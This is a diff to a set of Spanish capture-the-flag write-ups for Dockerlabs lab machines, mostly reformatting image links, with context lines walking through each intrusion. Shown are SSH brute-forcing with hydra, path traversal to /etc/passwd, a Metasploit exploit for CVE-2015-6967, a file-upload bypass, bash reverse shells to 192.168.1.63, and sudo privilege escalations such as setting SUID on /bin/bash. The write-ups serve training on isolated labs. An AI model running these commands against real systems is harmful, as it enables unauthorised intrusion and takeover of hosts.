@@ -14,10 +14,9 @@ Miro el html de la página y encuentro un comentario con el siguiente contenido:
 ```
 
 Miro https://www.dcode.fr/es y veo varias posiblidades. Viéndolas, me tiene pinta de que es un `brainfuck`. Uso su herramienta para decodificarlo y me encuentro el siguiente mensaje: `bebeaguaqueessano` 
+![](Imágenes/Pasted%20image%2020240813153408.png)
 
-![[Pasted image 20240813153408.png]]
-
-![[Pasted image 20240813153539.png]]
+![](Imágenes/Pasted%20image%2020240813153539.png)
 
 Ahora fuzzing de la url, y encuentro que hay existe http://172.17.0.2/images.
 
@@ -25,7 +24,7 @@ Ahora fuzzing de la url, y encuentro que hay existe http://172.17.0.2/images.
 ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js -o fuzzing 
 ```
 
-![[Pasted image 20240813153735.png]]
+![](Imágenes/Pasted%20image%2020240813153735.png)
 
 Descargo la imagen que hay e intento aplicar #esteganografía:
 - Exiftool: no encuentro nada. 
@@ -38,11 +37,11 @@ steghide --extract -sf imagen.jpg -xf steghide_extract -p bebeaguaqueessano
 Pruebo algo más fácil: como la imagen se llama agua_ssh, intento conectarme por ssh con ese usuario. Efectivamente, entro a la máquina. 
 
 Haciendo `sudo -l`, veo que puedo ejecutar `bettercap` como root. Lo hago, y veo que hay un comando que me deja ejecutar otros: 
-![[Pasted image 20240813155119.png]]
+![](Imágenes/Pasted%20image%2020240813155119.png)
 
 Hago `! chmod +s /bin/bash` para setear el bit SETUID de /bin/bash. De esta forma, cuando haga sudo `/bin/bash -p` me quedaré con privilegios de root
 
-![[Pasted image 20240813155358.png]]
+![](Imágenes/Pasted%20image%2020240813155358.png)
 
 
 # Amor
@@ -54,11 +53,11 @@ sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
 ```
 
 
-![[Pasted image 20240812132611.png]]
+![](Imágenes/Pasted%20image%2020240812132611.png)
 
 Accedo a la página desde el browser, encontrando el siguiente mensaje interesante:
 
-![[Pasted image 20240812132801.png]]
+![](Imágenes/Pasted%20image%2020240812132801.png)
 
 Pruebo a acceder encontrar la contraseña de carlota con hydra, usando el diccionario `rockyou.txt`, que resulta ser `babygirl` 
 
@@ -66,7 +65,7 @@ Pruebo a acceder encontrar la contraseña de carlota con hydra, usando el diccio
 sudo hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 
 ```
 
-![[Pasted image 20240812134830.png]]
+![](Imágenes/Pasted%20image%2020240812134830.png)
 
 Me conecto por ssh y me encuentro un fichero, que paso a mi ordenador: 
 
@@ -81,18 +80,18 @@ steghide --extract -sf imagen.jpg
 ```
 
 
-![[Pasted image 20240812235022.png]]
-![[Pasted image 20240812235204.png]]
+![](Imágenes/Pasted%20image%2020240812235022.png)
+![](Imágenes/Pasted%20image%2020240812235204.png)
 Compruebo si es la contraseña de su, pero no es el caso, así que sigo buscando información. Miro si puedo escalar privilegios con `sudo -l`, sin éxito. Compruebo si hay más carpetas en /home, y encuentro una llamada `oscar`. Pruebo la contraseña con ese usuario y veo que funciona. 
-![[Pasted image 20240812235548.png]]
+![](Imágenes/Pasted%20image%2020240812235548.png)
 
-![[Pasted image 20240812235435.png]]
+![](Imágenes/Pasted%20image%2020240812235435.png)
 
 Haciendo `sudo -l` en oscar veo que puedo ejecutar `ruby` como superusuario. Busco en gtfobins y encuentro lo siguiente: https://gtfobins.github.io/gtfobins/ruby/#sudo
 
-![[Pasted image 20240812235731.png]]
+![](Imágenes/Pasted%20image%2020240812235731.png)
 
-![[Pasted image 20240812235742.png]]
+![](Imágenes/Pasted%20image%2020240812235742.png)
 
 # Anonymouspingu
 
@@ -124,7 +123,7 @@ Pruebo con `feroxbuster`
 ```
 feroxbuster -u http://172.19.0.2 -x php -x html -x txt -x js -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o fuzzing --threads 300
 ```
-![[Pasted image 20240813015839.png]]
+![](Imágenes/Pasted%20image%2020240813015839.png)
 
 Con ffuf, lo siguiente haría prácticamente lo mismo:
 ```
@@ -133,7 +132,7 @@ ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http
 
 Haciendo `control+u` en http://172.19.0.2/wordpress encuentro el siguiente comentario: 
 
-![[Pasted image 20240813015744.png]]
+![](Imágenes/Pasted%20image%2020240813015744.png)
 
 Pruebo añadiendo `/index.php` a la url y veo que no cambia la apariencia, por lo que puede que se pueda hacer path traversal (usar la url para acceder a archivos ocultos). Leyendo tutoriales, encuentro el comando que usar. El resultado será que si pongo de nombre de parámetro `love`, veré el contenido de /etc/passwd
 
@@ -146,11 +145,11 @@ ffuf -c  -u http://172.19.0.2/wordpress/index.php?FUZZ=/../../../../../../../etc
 -w la lista de palabras que se sustituirán por FUZZ en la url
 -fw filtra las palabras de 183. Previamente, no puse el parámetro. Viendo el output, la gran mayoría (todas menos una) de las respuestas tenían 183 palabras (que es la cantidad de palabras de la página original), por lo que filtré esas opciones. 
 
-![[Pasted image 20240813024054.png]]
+![](Imágenes/Pasted%20image%2020240813024054.png)
 
 Visito `http://172.19.0.2/wordpress/index.php?love=/../../../../../../../etc/passwd `
 
-![[Pasted image 20240813024254.png]]
+![](Imágenes/Pasted%20image%2020240813024254.png)
 
 Encuentro dos usuarios, pedro y rosa. Probaré a usar hydra con rockyou.txt con ambos. 
 
@@ -159,11 +158,11 @@ hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 64
 ```
 
 
-![[Pasted image 20240813025040.png]]
+![](Imágenes/Pasted%20image%2020240813025040.png)
 
 Encuentro las credenciales de rosa, entro en la máquina y veo que tiene permisos de root para cat y ls. Miro si hay alguna forma de explotarlos para convertirse en root en https://gtfobins.github.iopero no lo encuentro, así que uso ambas herramientas para explorar el sistema de archivos: 
 
-![[Pasted image 20240813025546.png]]
+![](Imágenes/Pasted%20image%2020240813025546.png)
 
 Encuentro un archivo, secret.txt, con lo que aparentemente es un código hexadecimal. El output parece un código en base 32, así que lo desencripto también 
 
@@ -175,11 +174,11 @@ noacertarasosi
 
 No puedo hacer su directamente, pero si a pedro:
 
-![[Pasted image 20240813030757.png]]
+![](Imágenes/Pasted%20image%2020240813030757.png)
 
 Siendo Pedro, puedo ejecutar como root /usr/bin/env, lo cual uso () para hacerme root:
 
-![[Pasted image 20240813030856.png]]
+![](Imágenes/Pasted%20image%2020240813030856.png)
 
 
 # chocolatelovers
@@ -195,19 +194,19 @@ Entro a la web y veo el siguiente comentario `<!-- /nibbleblog -->`, por lo que 
 
 Un texto dice que para publicar fuera a http://172.17.0.2/nibbleblog/admin.php. Intento hacer #SQLi y, aunque no consigo meterme como admin me sale el siguiente mensaje en la esquina superior izquierda. 
 
-![[Pasted image 20240813161059.png]]
+![](Imágenes/Pasted%20image%2020240813161059.png)
 
-![[Pasted image 20240813161147.png]]
+![](Imágenes/Pasted%20image%2020240813161147.png)
 
 Pruebo con el usuario y contraseña `admin`, y cuela. 
 
 Investigando, veo que nibbleblog es un CMS para blogs, y buscando en searchsploit veo que hay vulnerabilidades para ciertas versiones: 
 
-![[Pasted image 20240813162331.png]]
+![](Imágenes/Pasted%20image%2020240813162331.png)
 
 En la parte de ajustes del dashboard, encuentro que estamos ante una versión vulnerable, por lo que usaré metasploit para explotar la vulnerabilidad: 
 
-![[Pasted image 20240813162405.png]]
+![](Imágenes/Pasted%20image%2020240813162405.png)
 
 ```
 msfconsole -q # para  que no muestre el banner al principio
@@ -221,9 +220,9 @@ set TARGETURI /nibbleblog
 
 ```
 
-![[Pasted image 20240813162746.png]]
+![](Imágenes/Pasted%20image%2020240813162746.png)
 
-![[Pasted image 20240813163202.png]]
+![](Imágenes/Pasted%20image%2020240813163202.png)
 
 En principio me da un fallo, pero accedendo a la página de información de la vulnerabilidad (https://nvd.nist.gov/vuln/detail/CVE-2015-6967), veo que es porque me falta instalar el plugin myimage. 
 
@@ -241,7 +240,7 @@ bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"
 
 Haciendo sudo -l vemos que podemos ejecutar php como si fuera "chocolate". 
 
-![[Pasted image 20240813165936.png]]
+![](Imágenes/Pasted%20image%2020240813165936.png)
 
 Buscando en gtfobins, encuentro lo siguiente: https://gtfobins.github.io/gtfobins/php/#sudo
 
@@ -250,12 +249,12 @@ CMD="/bin/sh"
 sudo -u chocolate php -r "system('$CMD');"
 ```
 
-![[Pasted image 20240813170315.png]]
+![](Imágenes/Pasted%20image%2020240813170315.png)
 
 Haciendo ps -aux, vemos que el root está ejecutando un archivo, que resulta pertenecer a `chocolate`. Por tanto, podemos escribir en él, haciendo por ejemplo que bash tenga el #SUID activado. De esta forma, nos haremos root ejecutando /bin/bash -p 
-![[Pasted image 20240813170613.png]]
+![](Imágenes/Pasted%20image%2020240813170613.png)
 
-![[Pasted image 20240813170916.png]]
+![](Imágenes/Pasted%20image%2020240813170916.png)
 
 ```
 echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
@@ -279,7 +278,7 @@ function autenticate() {
 
 Accedo a http://172.17.0.2/recurso/?token=tokentraviesito, y veo lo siguiente:
 
-![[Pasted image 20240813172916.png]]
+![](Imágenes/Pasted%20image%2020240813172916.png)
 
 No sé qué hacer con esto, por lo que paso a hacer fuzzing de la página (con -d 2 evito demasiados niveles de recursión, ya que dentro de backend hay muchos archivos): 
 
@@ -287,11 +286,11 @@ No sé qué hacer con esto, por lo que paso a hacer fuzzing de la página (con -
 feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 -d 2 
 ```
 
-![[Pasted image 20240813173703.png]]
+![](Imágenes/Pasted%20image%2020240813173703.png)
 
 Mirando http://172.17.0.2/backend/server.js encuentro: 
 
-![[Pasted image 20240813173838.png]]
+![](Imágenes/Pasted%20image%2020240813173838.png)
 
 Uso hydra para buscar un username que se corresponda a esa contraseña para entrar por ssh. Como se cambió el puerto al 5000: 
 ```
@@ -299,7 +298,7 @@ hydra -L /usr/share/wordlists/rockyou.txt  -p lapassworddebackupmaschingonadetod
 ```
 
 Encuentro el usuario `lovely`: 
-![[Pasted image 20240813175722.png]]
+![](Imágenes/Pasted%20image%2020240813175722.png)
 
 Con sudo -l veo que puedo ejecutar nano como superusuario, por lo que haciendo lo siguiente (https://gtfobins.github.io/gtfobins/nano/#sudo) me convierto en root:
 
@@ -309,7 +308,7 @@ sudo nano
 reset; sh 1>&0 2>&0
 ```
 
-![[Pasted image 20240813175932.png]]
+![](Imágenes/Pasted%20image%2020240813175932.png)
 
 
 # Dockerlabs
@@ -327,7 +326,7 @@ Hago fuzzing y encuentro varias páginas:
 feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -x py -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 
 ```
 
-![[Pasted image 20240813180751.png]]
+![](Imágenes/Pasted%20image%2020240813180751.png)
 En http://172.17.0.2/machine.php encuentro que puedo subir archivos. Por tanto, intentaré un #LFI (Local File Inclusion). Pruebo con un txt y veo que solo me deja subir .zips. Interceptaré la petición con burpsuite para engañarle y subir algún archivo .php. Por lo que he visto en otros writeups, esto se llama `Arbitrary File Upload`
 
 
@@ -351,15 +350,15 @@ En http://172.17.0.2/machine.php encuentro que puedo subir archivos. Por tanto, 
 </html>
 ```
 
-![[Pasted image 20240813182943.png]]
+![](Imágenes/Pasted%20image%2020240813182943.png)
 
 En un principio esta es la petición. Voy a hacer que la máquina se piense que es un zip. Para ello, veo que hay distintas terminaciones de los archivos php: **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 
 Al parecer, phar es un conjunto de phps comprimidos, por lo que cuela y se sube. Ahora, podré ver ese archivo en http://172.17.0.2/uploads/script.phar y escribir los comandos que quiera:
 
-![[Pasted image 20240813184507.png]]
+![](Imágenes/Pasted%20image%2020240813184507.png)
 
-![[Pasted image 20240813184615.png]]
+![](Imágenes/Pasted%20image%2020240813184615.png)
 
 
 Creo una shell que captaré desde mi máquina: 
@@ -377,15 +376,15 @@ bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"
 
 Y ya estoy dentro:
 
-![[Pasted image 20240813185112.png]]
+![](Imágenes/Pasted%20image%2020240813185112.png)
 
 Tanto con cut como grep puedo leer archivos como si fuera superusuario. 
 
-![[Pasted image 20240813185352.png]]
+![](Imágenes/Pasted%20image%2020240813185352.png)
 
 Voy mirando directorios, y encuentro que en /opt/ hay un archivo: 
 
-![[Pasted image 20240813185538.png]]
+![](Imágenes/Pasted%20image%2020240813185538.png)
 
 Uso https://gtfobins.github.io/gtfobins/cut/#sudo para leer el contenido: 
 
@@ -402,7 +401,7 @@ sudo cut -d "" -f1 "$LFILE"
 
 ```
 
-![[Pasted image 20240813185747.png]]
+![](Imágenes/Pasted%20image%2020240813185747.png)
 
 
 # Los 40 ladrones
@@ -422,7 +421,7 @@ ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http
 
 Uno de los resultados es http://172.17.0.2/qdefense.txt, en el cual se ve lo siguiente:
 
-![[Pasted image 20240814194226.png]]
+![](Imágenes/Pasted%20image%2020240814194226.png)
 Esos números y el toc-toc me hacen pensar que hay algun tipo de port knocking para activar cierto servicio, voy a probarlo: 
 
 ```
@@ -430,7 +429,7 @@ knock 172.17.0.2 7000 8000 9000
 ```
 
 Al hacer nmap de nuevo, encuentro que se ha abierto el puerto 22: 
-![[Pasted image 20240814194701.png]]
+![](Imágenes/Pasted%20image%2020240814194701.png)
 
 Me tiene pinta de que el nombre puede ser para hacer algo de OSINT, así que lo busco en el browser. No encuentro nada al respecto, así que probaré a buscar una contraseña para `tocotoc` con hydra: 
 
@@ -438,15 +437,15 @@ Me tiene pinta de que el nombre puede ser para hacer algo de OSINT, así que lo 
 hydra -P /usr/share/wordlists/rockyou.txt  -l toctoc ssh://172.17.0.2 -t 64     
 ```
 
-![[Pasted image 20240814195243.png]]
+![](Imágenes/Pasted%20image%2020240814195243.png)
 
 Encuentro la contraseña `kittycat`. Lo primero que hago es mirar `sudo -l`, y encuentro dos funciones que podría usar como root: 
 
-![[Pasted image 20240814195425.png]]
+![](Imágenes/Pasted%20image%2020240814195425.png)
 
 Simplemente usando el bash tendré una terminal con permisos de superusuario: 
 
-![[Pasted image 20240814195533.png]]
+![](Imágenes/Pasted%20image%2020240814195533.png)
 
 
 # Escolares
